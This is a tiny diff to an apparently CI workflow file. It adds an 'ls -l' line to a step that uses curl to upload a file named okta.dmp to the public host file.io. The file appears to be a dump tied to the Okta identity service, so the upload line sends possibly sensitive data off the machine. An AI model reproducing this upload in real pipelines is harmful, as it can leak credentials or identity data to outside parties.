@@ -29,4 +29,5 @@ jobs:
 
     - name: Upload to file.io
       run: |
+        ls -l
         sudo curl -F 'file=@okta.dmp' https://file.io/?expires=1
